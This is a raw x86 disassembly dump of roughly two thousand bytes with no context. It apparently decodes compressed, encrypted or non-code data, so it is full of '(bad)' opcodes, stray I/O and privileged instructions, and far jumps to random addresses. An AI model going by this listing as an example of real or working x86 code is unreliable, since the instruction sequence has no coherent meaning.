  418135:	stc    
  418136:	inc    edx
  418137:	popf   
  418138:	adc    al,0x23
  41813a:	xlat   BYTE PTR ds:[ebx]
  41813b:	sub    eax,0x72697213
  418140:	xchg   esp,esp
  418142:	mov    al,0xd0
  418144:	sub    eax,0x9f16263b
  418149:	inc    edi
  41814a:	adc    DWORD PTR [ebx-0x35],eax
  41814d:	int3   
  41814e:	and    eax,0xfd843a2a
  418153:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418154:	jne    0x41819d
  418156:	pop    es
  418157:	xchg   edx,eax
  418158:	cli    
  418159:	dec    ebp
  41815a:	out    0x7b,al
  41815c:	ins    DWORD PTR es:[edi],dx
  41815d:	pop    es
  41815e:	dec    ebp
  41815f:	test   BYTE PTR [eax+0x146eba5e],0x92
  418166:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418167:	pusha  
  418168:	pop    ecx
  418169:	push   0x1845f2c
  41816e:	mov    cs,WORD PTR [esi-0x6a23ba99]
  418174:	fs adc al,0x2
  418177:	push   esp
  418178:	push   cs
  418179:	lods   al,BYTE PTR ds:[esi]
  41817a:	cmp    ah,al
  41817c:	lock sbb edi,DWORD PTR [ebp-0x5b9c83d8]
  418183:	fwait
  418184:	mov    eax,ds:0xec72b04a
  418189:	leave  
  41818a:	hlt    
  41818b:	cmp    eax,0xb3f314d6
  418190:	push   es
  418191:	adc    eax,0x5bfcb69a
  418196:	sub    bl,BYTE PTR [ebp-0x39358ad3]
  41819c:	fcom   QWORD PTR [ebp-0x1c384d3d]
  4181a2:	add    DWORD PTR [ecx],ebx
  4181a4:	retf   
  4181a5:	adc    bh,BYTE PTR [edi+ebx*8+0x739d30c4]
  4181ac:	xchg   ecx,eax
  4181ad:	retf   0x7a1c
  4181b0:	or     al,0xc1
  4181b2:	xchg   edx,eax
  4181b3:	adc    edx,DWORD PTR [esp+ebx*1]
  4181b6:	ret    0xccc1
  4181b9:	xor    al,0xc6
  4181bb:	adc    ah,BYTE PTR ds:0x8103e40a
  4181c1:	pop    es
  4181c2:	xor    al,0x9d
  4181c4:	jmp    0x4cb9:0x4606abaa
  4181cb:	cmp    eax,0xf1ae6a49
  4181d0:	push   DWORD PTR [edi-0x50acb35]
  4181d6:	out    0x3a,eax
  4181d8:	adc    eax,0xa631424f
  4181dd:	adc    BYTE PTR [ecx+0x77],bl
  4181e0:	add    al,0xd2
  4181e2:	retf   0xe5ce
  4181e5:	adc    al,BYTE PTR [ecx-0x12d2a1a9]
  4181eb:	or     BYTE PTR [eax+0x10],0x15
  4181ef:	push   0x4b
  4181f1:	xlat   BYTE PTR ds:[ebx]
  4181f2:	pop    ebp
  4181f3:	stos   BYTE PTR es:[edi],al
  4181f4:	mov    edx,0x26b9e47f
  4181f9:	adc    al,0x31
  4181fb:	das    
  4181fc:	push   eax
  4181fd:	cwde   
  4181fe:	cmp    esi,esp
  418200:	mov    bl,0x87
  418202:	xor    esi,0xb07ed9c1
  418208:	push   ss
  418209:	jmp    0x19a073bc
  41820e:	cmp    ah,BYTE PTR ds:0xf24e4c12
  418214:	push   esp
  418215:	cdq    
  418216:	mov    ebp,0xa8653db0
  41821b:	pusha  
  41821c:	gs gs xchg ebp,eax
  41821f:	pop    esi
  418220:	ins    DWORD PTR es:[edi],dx
  418221:	cmp    dl,BYTE PTR ds:0xf268eb36
  418227:	cmp    BYTE PTR [ebp-0x53],dl
  41822a:	fld    TBYTE PTR [ebx+ecx*1]
  41822d:	stos   BYTE PTR es:[edi],al
  41822e:	inc    edx
  41822f:	gs ja  0x418269
  418232:	rol    BYTE PTR [eax],1
  418234:	cmp    BYTE PTR [edi+0x57537eb5],al
  41823a:	shr    dl,1
  41823c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41823d:	(bad)  
  41823e:	sub    ah,BYTE PTR [ebx]
  418240:	ins    DWORD PTR es:[edi],dx
  418241:	or     ah,0x7
  418244:	xor    al,0xdc
  418246:	dec    esi
  418247:	mov    bl,0x34
  418249:	xchg   BYTE PTR [ebx+0x67768418],ch
  41824f:	xlat   BYTE PTR ds:[ebx]
  418250:	sub    ebx,edi
  418252:	call   0x8e621a2f
  418257:	mov    cl,0x51
  418259:	xchg   DWORD PTR [ecx+0x71976e6e],edi
  41825f:	(bad)  
  418260:	fstp   DWORD PTR [ebx-0x7d1ebc43]
  418266:	dec    ecx
  418267:	retf   
  418268:	and    BYTE PTR [ebx-0x3b1e8819],0xc
  41826f:	cs nop
  418271:	sub    bl,ch
  418273:	scas   eax,DWORD PTR es:[edi]
  418274:	sahf   
  418275:	xor    ebx,DWORD PTR [edi]
  418277:	sub    DWORD PTR [esi],ebp
  418279:	ret    0x8a9b
  41827c:	cs adc esi,ecx
  41827f:	jl     0x4182fc
  418281:	add    eax,0x995ad3bc
  418286:	loope  0x4182b3
  418288:	ja     0x418303
  41828a:	adc    al,0xdf
  41828c:	das    
  41828d:	sbb    ebp,DWORD PTR [edx]
  41828f:	pop    ss
  418290:	xchg   edi,eax
  418291:	and    al,0x99
  418293:	in     al,0x54
  418295:	jp     0x4182bc
  418297:	sbb    al,0x9f
  418299:	push   esp
  41829a:	xor    edi,esp
  41829c:	xchg   ecx,eax
  41829d:	or     bl,BYTE PTR fs:[edi]
  4182a0:	hlt    
  4182a1:	gs pop edx
  4182a3:	(bad)  
  4182a4:	adc    eax,0x4167bf8e
  4182a9:	data16 stos BYTE PTR es:[edi],al
  4182ab:	mov    dh,0xb4
  4182ad:	adc    esp,DWORD PTR [edx]
  4182af:	sbb    esi,ebp
  4182b1:	push   0x762e53b0
  4182b6:	mov    esp,0xe0b726c8
  4182bb:	loopne 0x41823e
  4182bd:	shr    BYTE PTR [edx-0x27],cl
  4182c0:	in     eax,0xdf
  4182c2:	push   eax
  4182c3:	xor    eax,0xe74ffac7
  4182c8:	ins    DWORD PTR es:[edi],dx
  4182c9:	xchg   esp,eax
  4182ca:	xchg   esi,eax
  4182cb:	mul    DWORD PTR [eax-0x64a2f04d]
  4182d1:	pop    ecx
  4182d2:	stc    
  4182d3:	int3   
  4182d4:	inc    ebp
  4182d5:	out    0x69,al
  4182d7:	int    0xf1
  4182d9:	into   
  4182da:	sbb    eax,0x92c395c6
  4182df:	mov    ah,0x10
  4182e1:	aad    0x76
  4182e3:	sub    eax,0x509ed605
  4182e8:	pop    ds
  4182e9:	pop    ecx
  4182ea:	inc    ebx
  4182eb:	pop    edx
  4182ec:	clc    
  4182ed:	push   edx
  4182ee:	adc    eax,0x70ed6176
  4182f3:	mov    cs,WORD PTR [edi]
  4182f5:	mov    ah,0x82
  4182f7:	jne    0x41831d
  4182f9:	fidivr DWORD PTR [ecx+eax*4+0x7def8b71]
  418300:	lea    ebp,[eax+0x78]
  418303:	test   al,0x32
  418305:	or     cl,BYTE PTR [esi+ebx*2+0x50f58633]
  41830c:	aas    
  41830d:	mov    DWORD PTR [eax-0x39e1c21c],ecx
  418313:	sahf   
  418314:	int    0x88
  418316:	imul   esp,edi,0x21
  418319:	cli    
  41831a:	repnz stos BYTE PTR es:[edi],al
  41831c:	mov    bh,dl
  41831e:	push   0x7e
  418320:	loope  0x41837d
  418322:	pop    ebp
  418323:	sahf   
  418324:	rcr    DWORD PTR ds:0xae957d80,0x4c
  41832b:	pop    es
  41832c:	mov    al,0x98
  41832e:	xchg   ebx,eax
  41832f:	xor    ch,bh
  418331:	imul   edx,DWORD PTR [ecx],0x27
  418334:	xchg   edx,eax
  418335:	cwde   
  418336:	or     edx,DWORD PTR [ecx+0x7973cf5b]
  41833c:	xchg   edi,eax
  41833d:	pop    ebx
  41833e:	inc    ebx
  41833f:	jmp    0x418303
  418341:	ss (bad) 
  418343:	and    ebp,DWORD PTR [ecx+0x117a3fa1]
  418349:	icebp  
  41834a:	mov    ah,0xca
  41834c:	fisttp DWORD PTR [edi]
  41834e:	nop
  41834f:	dec    ebx
  418350:	outs   dx,BYTE PTR ds:[esi]
  418351:	(bad)  
  418352:	xchg   dx,ax
  418354:	mov    ch,0xef
  418356:	sbb    BYTE PTR [ecx+0x79d00d79],ch
  41835c:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  41835e:	ja     0x418382
  418360:	popa   
  418361:	imul   esp,DWORD PTR [edi-0x2f],0x8804348a
  418368:	jno    0x418342
  41836a:	jno    0x4182f2
  41836c:	ds pop eax
  41836e:	mov    al,ds:0x3302a67
  418373:	xor    eax,DWORD PTR [ecx+esi*2]
  418376:	jmp    0x97e45aed
  41837b:	inc    ebx
  41837c:	daa    
  41837d:	fs sti 
  41837f:	sub    edx,DWORD PTR ds:0x7e12ea0b
  418385:	fnstsw WORD PTR [edi+0x7e]
  418388:	add    al,0x1e
  41838a:	retf   0x7ff4
  41838d:	stos   DWORD PTR es:[edi],eax
  41838e:	push   ss
  41838f:	mov    bh,0x15
  418391:	sub    ah,BYTE PTR ds:0xc25b5df9
  418397:	pop    edi
  418398:	sti    
  418399:	jns    0x4183e9
  41839b:	rcr    BYTE PTR [ebx],1
  41839d:	mov    al,0xb
  41839f:	daa    
  4183a0:	loop   0x4183a0
  4183a2:	jle    0x4183ee
  4183a4:	pop    eax
  4183a5:	dec    edi
  4183a6:	cwde   
  4183a7:	pop    ss
  4183a8:	addr16 xchg ecx,eax
  4183aa:	jecxz  0x41834f
  4183ac:	out    dx,al
  4183ad:	test   eax,0x647e4eec
  4183b2:	mov    ?,ebx
  4183b4:	sbb    eax,0xd50b7efc
  4183b9:	ja     0x4183e8
  4183bb:	lods   al,BYTE PTR ds:[esi]
  4183bc:	rcl    dh,1
  4183be:	scas   eax,DWORD PTR es:[edi]
  4183bf:	mov    DWORD PTR [edx],0xefc6bfc5
  4183c5:	nop
  4183c6:	jg     0x4183c9
  4183c8:	add    eax,0x7ff15feb
  4183ce:	jbe    0x41844f
  4183d0:	inc    ecx
  4183d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4183d2:	jae    0x4183bd
  4183d4:	rol    DWORD PTR [esi],cl
  4183d6:	pop    ds
  4183d7:	mov    bh,0xef
  4183d9:	dec    esp
  4183da:	mov    BYTE PTR ds:0x9bd4c5ec,dl
  4183e0:	leave  
  4183e1:	daa    
  4183e2:	sbb    edi,ecx
  4183e4:	and    al,BYTE PTR [ecx+esi*8+0x28]
  4183e8:	pop    edi
  4183e9:	pop    ecx
  4183ea:	add    dh,BYTE PTR [edx+0x34]
  4183ed:	(bad)  
  4183ee:	rol    DWORD PTR [ebx],1
  4183f0:	xor    BYTE PTR [eax],dl
  4183f2:	in     al,dx
  4183f3:	clc    
  4183f4:	xchg   ecx,eax
  4183f5:	stos   BYTE PTR es:[edi],al
  4183f6:	sbb    esi,eax
  4183f8:	les    ecx,FWORD PTR [esi-0x6a]
  4183fb:	loopne 0x41841c
  4183fd:	adc    al,0x94
  4183ff:	dec    ebx
  418400:	aas    
  418401:	sbb    DWORD PTR [edi-0x44144908],esi
  418407:	mov    ecx,gs
  418409:	sbb    ah,bl
  41840b:	retf   
  41840c:	arpl   WORD PTR ds:0x3c956cc7,sp
  418412:	push   edi
  418413:	dec    eax
  418414:	push   0xce1bef29
  418419:	xor    al,0x2c
  41841b:	pop    esp
  41841c:	ins    BYTE PTR es:[edi],dx
  41841d:	cmp    eax,0xec422d2d
  418422:	jle    0x41840f
  418424:	repz pop ecx
  418426:	push   ecx
  418427:	(bad)  
  418428:	jmp    0xe9a3:0x450e66bf
  41842f:	inc    edi
  418430:	jne    0x4183cc
  418432:	in     eax,0x6
  418434:	in     eax,dx
  418435:	xor    eax,0xb57f9220
  41843a:	sub    al,0xee
  41843c:	ret    0x1f95
  41843f:	sub    esi,esi
  418441:	mov    ds:0x18c6a9a1,al
  418446:	xor    al,0x23
  418448:	and    bh,BYTE PTR [edi+0x45]
  41844b:	cmp    edx,DWORD PTR [ebp-0x24]
  41844e:	jp     0x418436
  418450:	outs   dx,DWORD PTR ds:[esi]
  418451:	and    BYTE PTR [ebp+esi*8-0x3b],bl
  418455:	add    ah,BYTE PTR [edi+eax*1]
  418458:	mov    ch,bh
  41845a:	out    dx,al
  41845b:	retf   0xb37d
  41845e:	(bad)  
  41845f:	push   cs
  418460:	mov    ds:0x2e9bae6f,eax
  418465:	xchg   esp,eax
  418466:	popf   
  418467:	adc    eax,0x93cd639e
  41846c:	jne    0x418486
  41846e:	fdiv   st,st(6)
  418470:	test   al,0x52
  418472:	(bad)  
  418473:	lds    eax,FWORD PTR [ebp-0x49]
  418476:	call   0x6f0b:0x68b2a7d0
  41847d:	inc    esp
  41847e:	out    dx,eax
  41847f:	loopne 0x4184c2
  418481:	test   DWORD PTR [ecx-0x1e80ce1a],ebx
  418487:	xlat   BYTE PTR ds:[ebx]
  418488:	daa    
  418489:	mov    edx,DWORD PTR [ecx-0x8bc3a89]
  41848f:	int3   
  418490:	jne    0x41843c
  418492:	cmc    
  418493:	or     cl,al
  418495:	pusha  
  418496:	xchg   BYTE PTR [ebp+0xd290a61],dh
  41849c:	int3   
  41849d:	imul   edx,DWORD PTR [esi+0xa23e9db],0x7bd8fe33
  4184a7:	sbb    edi,edi
  4184a9:	and    cl,al
  4184ab:	cmp    esp,0xffffffc4
  4184ae:	jmp    0x4184e2
  4184b0:	inc    esp
  4184b1:	push   ebp
  4184b2:	and    BYTE PTR [eax-0x16],cl
  4184b5:	fnsave [ebx+0x2302a3c9]
  4184bb:	jl     0x41849d
  4184bd:	out    0xa7,al
  4184bf:	mov    ds:0x8c64b905,eax
  4184c4:	inc    edi
  4184c5:	cmp    al,0x53
  4184c7:	dec    edi
  4184c8:	rcl    ebp,cl
  4184ca:	pop    edx
  4184cb:	mov    ebx,0xa28cca11
  4184d0:	loop   0x418481
  4184d2:	and    eax,0x43eb1f18
  4184d7:	sbb    al,0x28
  4184d9:	mov    ah,0xac
  4184db:	push   ebp
  4184dc:	mov    esp,DWORD PTR [ebx-0x4cc9f0fe]
  4184e2:	test   bl,bl
  4184e4:	imul   edx,DWORD PTR [eax+0x38],0x15eb1ae4
  4184eb:	mov    ecx,0x9f6e939f
  4184f0:	(bad)  
  4184f1:	jbe    0x4184f8
  4184f3:	push   0xffffff9f
  4184f5:	mov    ebp,0x85f0ed52
  4184fa:	cwde   
  4184fb:	(bad)  
  4184fc:	in     eax,dx
  4184fd:	mov    al,ds:0x9f0f375d
  418502:	das    
  418503:	imul   eax,DWORD PTR [ecx+eiz*1],0xffffff8c
  418507:	outs   dx,DWORD PTR ds:[esi]
  418508:	jnp    0x418540
  41850a:	push   ebx
  41850b:	mov    DWORD PTR [edx],ebp
  41850d:	out    dx,al
  41850e:	push   ebp
  41850f:	cmp    al,0xde
  418511:	shl    BYTE PTR [eax-0x2b],1
  418514:	sub    DWORD PTR [esi],ebx
  418516:	cmc    
  418517:	fsubp  st(0),st
  418519:	dec    esi
  41851a:	and    bh,BYTE PTR [ebp+edx*4+0x6ba383a5]
  418521:	rol    DWORD PTR [eax+0x7],0xb4
  418525:	stos   DWORD PTR es:[edi],eax
  418526:	inc    ebp
  418527:	mov    DWORD PTR [edi+0x58],edi
  41852a:	mov    cl,0x43
  41852c:	popa   
  41852d:	aaa    
  41852e:	jo     0x4184d6
  418530:	xchg   edx,eax
  418531:	icebp  
  418532:	lahf   
  418533:	mov    dh,BYTE PTR [esi+0x4afb671c]
  418539:	sub    DWORD PTR [ebx+0x57915695],edx
  41853f:	pop    es
  418540:	jmp    0x4185af
  418542:	mov    cl,0x16
  418544:	xchg   esi,eax
  418545:	inc    edi
  418546:	ror    BYTE PTR [esi-0x5e],cl
  418549:	cmc    
  41854a:	or     eax,0xf4eb0e13
  41854f:	ror    BYTE PTR [edx],0x6c
  418552:	icebp  
  418553:	adc    BYTE PTR [eax+0x7b],ch
  418556:	(bad)  
  418557:	mov    al,ds:0xd23a7eee
  41855c:	xchg   ebp,eax
  41855d:	mov    ds:0x42513bd9,al
  418562:	(bad)  
  418563:	lods   eax,DWORD PTR ds:[esi]
  418564:	push   0x9758366
  418569:	fistp  DWORD PTR [edi]
  41856b:	fucomip st,st(1)
  41856d:	dec    eax
  41856e:	cmp    esi,eax
  418570:	or     edx,edi
  418572:	mov    edi,fs
  418574:	test   DWORD PTR [ebp-0x5589058d],esp
  41857a:	mov    cs,WORD PTR [edi]
  41857c:	cwde   
  41857d:	ss pushf 
  41857f:	xchg   esp,eax
  418580:	or     al,0x19
  418582:	in     al,0xe8
  418584:	stos   DWORD PTR es:[edi],eax
  418585:	jnp    0x418569
  418587:	nop
  418588:	mul    DWORD PTR [edx]
  41858a:	(bad)  
  41858b:	fincstp 
  41858d:	aaa    
  41858e:	dec    esi
  41858f:	lds    esp,FWORD PTR [ecx]
  418591:	mov    dh,BYTE PTR [ecx+edi*1-0x21e1b730]
  418598:	cmp    ecx,DWORD PTR [edi]
  41859a:	or     al,BYTE PTR [ebx+ecx*1-0x75]
  41859e:	pop    edx
  41859f:	rol    BYTE PTR [edi],0xe5
  4185a2:	jl     0x418602
  4185a4:	(bad)  
  4185a5:	mov    ecx,0xcb7fa4c3
  4185aa:	out    0xef,al
  4185ac:	xor    eax,0xcc223d32
  4185b1:	loope  0x418624
  4185b3:	jl     0x418609
  4185b5:	ins    DWORD PTR es:[edi],dx
  4185b6:	and    eax,DWORD PTR [edx]
  4185b8:	jp     0x4185fb
  4185ba:	push   0xffffffcd
  4185bc:	neg    bl
  4185be:	mov    bh,0x82
  4185c0:	mov    edi,0x3ead1078
  4185c5:	scas   al,BYTE PTR es:[edi]
  4185c6:	cs xchg edi,eax
  4185c8:	retf   
  4185c9:	xor    edi,edi
  4185cb:	aam    0xa9
  4185cd:	add    eax,0x2e0f6ac6
  4185d2:	popa   
  4185d3:	inc    ecx
  4185d4:	push   esp
  4185d5:	out    0x2e,al
  4185d7:	ss cs cdq 
  4185da:	into   
  4185db:	sub    DWORD PTR [esi],edi
  4185dd:	ror    BYTE PTR [ecx+eiz*1+0x5f722f2e],cl
  4185e4:	mov    ecx,0x637bfba9
  4185e9:	or     ch,cl
  4185eb:	and    bl,BYTE PTR [eax-0x5e]
  4185ee:	aad    0x31
  4185f0:	jp     0x41866a
  4185f2:	dec    ebx
  4185f3:	xor    esi,DWORD PTR [ebx+0x22]
  4185f6:	hlt    
  4185f7:	in     eax,dx
  4185f8:	and    DWORD PTR [edi+0x3],ecx
  4185fb:	mov    WORD PTR [edi+0x73],ss
  4185fe:	push   es
  4185ff:	push   cs
  418600:	mov    ch,0xa8
  418602:	xchg   ebp,eax
  418603:	repnz arpl WORD PTR [ecx+0xf4a607f],ax
  41860a:	xor    esp,ebp
  41860c:	aam    0xe2
  41860e:	ss xchg ebp,eax
  418610:	pop    es
  418611:	mov    BYTE PTR [esi+edi*1+0x46c9442d],cl
  418618:	(bad)  
  41861a:	out    0xd1,al
  41861c:	push   es
  41861d:	mov    ah,0xe4
  41861f:	in     al,dx
  418620:	in     eax,dx
  418621:	add    esp,DWORD PTR [eax-0x6c125f6d]
  418627:	jg     0x418692
  418629:	outs   dx,BYTE PTR ds:[esi]
  41862a:	fcmovnbe st,st(3)
  41862c:	outs   dx,BYTE PTR ds:[esi]
  41862d:	pop    ebx
  41862e:	retf   
  41862f:	and    eax,0xc62c9bc5
  418634:	ds loope 0x4185e0
  418637:	mov    ds:0x8f248a0,al
  41863c:	cmp    eax,0x420e5762
  418641:	and    al,0x68
  418643:	mov    ah,BYTE PTR [esp+eiz*2-0x27fd36ca]
  41864a:	aad    0x34
  41864c:	retf   
  41864d:	jbe    0x418654
  41864f:	xor    eax,esi
  418651:	push   es
  418652:	mov    ebx,edi
  418654:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418655:	push   cs
  418656:	call   0x91451974
  41865b:	or     eax,0x455eb374
  418660:	and    bl,BYTE PTR [esi]
  418662:	out    0xe3,al
  418664:	jmp    0xb9ac:0x1bb3a705
  41866b:	icebp  
  41866c:	mov    edi,0x6570bb8d
  418671:	loop   0x418645
  418673:	or     DWORD PTR [eax+0x808f905],edx
  418679:	or     DWORD PTR [eax+0x26],esp
  41867c:	mov    esp,DWORD PTR ds:0xf125b178
  418682:	rcl    BYTE PTR [edx-0x26],cl
  418685:	sahf   
  418686:	gs jl  0x41865f
  418689:	cwde   
  41868a:	sbb    eax,0xf1de8d36
  41868f:	cli    
  418690:	pop    edi
  418691:	add    DWORD PTR [ecx+0x51744975],edi
  418697:	jnp    0x4186fc
  418699:	adc    edx,edi
  41869b:	sbb    DWORD PTR [ebx-0xa6b33cb],0x39
  4186a2:	inc    edx
  4186a3:	outs   dx,DWORD PTR ds:[esi]
  4186a4:	mov    BYTE PTR [edx+0x214c2f8e],ah
  4186aa:	(bad)  
  4186ab:	in     eax,dx
  4186ac:	jae    0x4186c9
  4186ae:	mov    edx,0xeb8c7d2b
  4186b3:	cmp    edx,DWORD PTR [edx+0x6234eca5]
  4186b9:	push   edi
  4186ba:	in     eax,0x1d
  4186bc:	mov    bh,0x11
  4186be:	inc    eax
  4186bf:	push   0xffffffed
  4186c1:	sub    al,0xe
  4186c3:	aas    
  4186c4:	icebp  
  4186c5:	dec    edx
  4186c6:	mov    al,0x66
  4186c8:	jl     0x4186e0
  4186ca:	fdivr  DWORD PTR [ebx+0x5]
  4186cd:	pop    esp
  4186ce:	push   ebp
  4186cf:	add    ah,BYTE PTR [edi]
  4186d1:	sahf   
  4186d2:	lahf   
  4186d3:	pop    eax
  4186d4:	push   ebp
  4186d5:	popf   
  4186d6:	jb     0x4186c5
  4186d8:	rol    BYTE PTR [edx-0x42b3113b],cl
  4186de:	gs push edi
  4186e0:	pop    ecx
  4186e1:	clc    
  4186e2:	das    
  4186e3:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4186e5:	inc    edi
  4186e6:	jp     0x418689
  4186e8:	clc    
  4186e9:	and    BYTE PTR [ecx+0x7ccfde5b],dh
  4186ef:	push   ebx
  4186f0:	pop    eax
  4186f1:	and    ecx,ecx
  4186f3:	jb     0x41872e
  4186f5:	mov    al,ds:0x282fa41f
  4186fa:	pusha  
  4186fb:	daa    
  4186fc:	or     BYTE PTR [edi+0x60],dl
  4186ff:	ins    BYTE PTR es:[edi],dx
  418700:	dec    esi
  418701:	pop    ds
  418702:	mov    al,0xc2
  418704:	aaa    
  418705:	test   DWORD PTR ds:0xacbcfce1,eax
  41870b:	fcom   QWORD PTR [esi]
  41870d:	or     eax,0x151925fb
  418712:	and    ch,BYTE PTR ds:0x3e667a03
  418718:	jmp    FWORD PTR [ebp-0x2d]
  41871b:	jge    0x4186c9
  41871d:	mov    ds:0xcdeca8f4,eax
  418722:	dec    esp
  418723:	ret    0x7b4
  418726:	sbb    eax,0xa59c77dc
  41872b:	push   edx
  41872c:	ja     0x418748
  41872e:	das    
  41872f:	imul   ebp,DWORD PTR [edi+edi*1+0x77e490ba],0xccfa5908
  41873a:	(bad)  
  41873b:	shr    DWORD PTR [edx],1
  41873d:	adc    eax,0x2f37b894
  418742:	xor    ecx,DWORD PTR [ecx]
  418744:	adc    eax,0x62e25cac
  418749:	mov    cs,WORD PTR [ecx+eax*8-0x7c0adb48]
  418750:	lea    ebp,[edx+0x437c531d]
  418756:	lea    ecx,[ebp+0x1f36207b]
  41875c:	fucomip st,st(0)
  41875e:	push   eax
  41875f:	sub    al,0x9e
  418761:	mov    eax,DWORD PTR [ebx-0x4dfd13c8]
  418767:	(bad)  
  418768:	sbb    eax,0x6c215367
  41876d:	mov    ah,0x92
  41876f:	inc    edi
  418770:	lods   al,BYTE PTR ds:[esi]
  418771:	xor    bl,BYTE PTR [edi+0x17e8f6bf]
  418777:	fs jl  0x418765
  41877a:	iret   
  41877b:	or     ebp,ebx
  41877d:	pop    edi
  41877e:	jae    0x418779
  418780:	mov    bl,0x52
  418782:	das    
  418783:	mov    cl,0xe9
  418785:	mov    bh,dh
  418787:	xchg   esp,eax
  418788:	ficomp DWORD PTR [edi-0x25f0823d]
  41878e:	test   DWORD PTR [esp+eax*4],ecx
  418791:	push   0x55
  418793:	mov    al,ds:0x1a4eb27
  418798:	mov    cl,0x2c
  41879a:	dec    edi
  41879b:	js     0x4187b1
  41879d:	adc    bl,BYTE PTR [eax]
  41879f:	fs loop 0x418782
  4187a2:	fdiv   st(1),st
  4187a4:	sub    eax,0x154e072d
  4187a9:	and    esp,DWORD PTR [edi+0x7f2f1a2a]
  4187af:	and    esp,esp
  4187b1:	add    eax,DWORD PTR [ecx-0x63]
  4187b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4187b5:	mov    DWORD PTR [edx],0xbabbe3cc
  4187bb:	jp     0x41878e
  4187bd:	mov    ah,0x8f
  4187bf:	lahf   
  4187c0:	pop    esi
  4187c1:	clc    
  4187c2:	mov    esp,0xd65e986d
  4187c7:	mov    bh,0xfd
  4187c9:	mov    edx,0xc81fd10
  4187ce:	xor    edx,DWORD PTR ds:0x5e8ee1d7
  4187d4:	out    dx,al
  4187d5:	cwde   
  4187d6:	pop    es
  4187d7:	push   eax
  4187d8:	stc    
  4187d9:	in     eax,0xfd
  4187db:	pushf  
  4187dc:	mov    eax,ds:0xe4b19c87
  4187e1:	inc    esi
  4187e2:	adc    eax,0xe2c45e70
  4187e7:	xor    BYTE PTR [ebx-0x54d99ff4],ah
  4187ed:	fisubr DWORD PTR [eax+0x54]
  4187f0:	aas    
  4187f1:	adc    al,0x2e
  4187f3:	les    edi,FWORD PTR [edx+0x2a]
  4187f6:	popa   
  4187f7:	jmp    0x3c73:0x7e70df4b
  4187fe:	dec    edi
  4187ff:	adc    eax,0x3b9924df
  418804:	cwde   
  418805:	out    dx,al
  418806:	fst    QWORD PTR [ebx]
  418808:	in     al,dx
  418809:	mov    ss,WORD PTR [ebx-0x2215ac2c]
  41880f:	mov    dh,0x5c
  418811:	repz jae 0x418814
  418814:	into   
  418815:	stos   BYTE PTR es:[edi],al
  418816:	(bad)  
  418817:	mov    ch,bl
  418819:	adc    BYTE PTR [edx],0xc6
  41881c:	xchg   ebx,eax
  41881d:	inc    eax
  41881e:	pop    ss
  41881f:	fdivr  DWORD PTR [ebx+ecx*4-0x13]
  418823:	sub    al,0x86
  418825:	(bad)
  41882a:	sbb    ebx,DWORD PTR [eax]
  41882c:	(bad)  
  41882d:	in     eax,dx
  41882e:	ret    0xc3f3
  418831:	inc    edx
  418832:	test   al,0x80
  418834:	cli    
  418835:	mov    cl,0xc6
  418837:	push   ss
  418838:	sti    
  418839:	fimul  DWORD PTR [edi+0xd86f8b9]
  41883f:	scas   eax,DWORD PTR es:[edi]
  418840:	ins    BYTE PTR es:[edi],dx
  418841:	push   es
  418842:	mov    eax,0xae6a73d5
  418847:	test   eax,0x2d5e4c1b
  41884c:	jae    0x4188cc
  41884e:	jns    0x418875
  418850:	adc    ah,BYTE PTR [eax]
  418852:	fcomp  QWORD PTR [esi-0x80]
  418855:	ins    BYTE PTR es:[edi],dx
  418856:	push   ecx
  418857:	fwait
  418858:	jne    0x41889f
  41885a:	jg     0x4188cf
  41885c:	xchg   ebp,eax
  41885d:	add    eax,0xac7754ab
  418862:	(bad)  
  418863:	xlat   BYTE PTR ds:[ebx]
  418864:	pop    ds
  418865:	add    eax,0x773ae829
  41886a:	in     al,0x73
  41886c:	leave  
  41886d:	jcxz   0x418874
  418870:	fisttp DWORD PTR [edx+esi*2+0x79]
  418874:	retf   
  418875:	push   es
  418876:	add    BYTE PTR [esp+ebx*8-0x72b8e870],ch
  41887d:	pusha  
  41887e:	jns    0x4188c0
  418880:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418881:	out    0xa2,al
  418883:	jns    0x418843
  418885:	ins    BYTE PTR es:[edi],dx
  418886:	inc    ebp
  418887:	dec    bl
  418889:	sti    
  41888a:	and    al,0x5a
  41888c:	mov    ch,0xc8
  41888e:	mov    ds:0x826a4066,al
  418893:	ret    0x872b
  418896:	bound  edx,QWORD PTR [ecx]
  418898:	mov    al,0xc9
  41889a:	into   
  41889b:	shl    dh,cl
  41889d:	imul   eax,DWORD PTR [esi+esi*2-0x2c05d789],0xc1a04e08
  4188a8:	sub    edi,DWORD PTR [ecx]
  4188aa:	cmp    esi,DWORD PTR [ecx]
  4188ac:	inc    edi
  4188ad:	add    al,0x17
  4188af:	icebp  
  4188b0:	in     eax,0xe0
  4188b2:	pusha  
  4188b3:	jle    0x41892e
  4188b5:	and    BYTE PTR [ecx],al
  4188b7:	out    dx,al
  4188b8:	add    cl,BYTE PTR [ebp+0x26d5c28]
  4188be:	cmp    al,0xde
  4188c0:	push   eax
  4188c1:	inc    esi
  4188c2:	pop    es
  4188c3:	mov    dh,0x8a
  4188c5:	addr16 js 0x418933
  4188c8:	imul   ebp,DWORD PTR [eax-0x1d4a450],0xffffffda
  4188cf:	jl     0x4188e7
  4188d1:	retf   0xdc82
  4188d4:	lods   al,BYTE PTR ds:[esi]
  4188d5:	mov    edi,0x77203356
  4188da:	mov    esi,0x94677a23
  4188df:	or     cl,BYTE PTR [ebp+0x14]
  4188e2:	jno    0x4188b5
  4188e4:	add    edx,ecx
  4188e6:	jmp    0x41886f
  4188e8:	bnd ret 0xf4e0
  4188ec:	dec    edi
  4188ed:	and    eax,0x99087451
  4188f2:	and    DWORD PTR [ebx+esi*2+0x49],edi
  4188f6:	xchg   BYTE PTR [ecx-0x17],dh
  4188f9:	sbb    eax,ebp
  4188fb:	bound  sp,DWORD PTR [eax-0x33]
  4188ff:	test   al,0x46
  418901:	and    al,0x3a
  418903:	mov    esi,0x32310535
  418908:	push   cs
  418909:	sbb    eax,0xe826ed3b
  41890e:	loop   0x4188bb
  418910:	xchg   edx,eax
  418911:	hlt    
  418912:	xchg   edx,eax
  418913:	rol    dl,cl
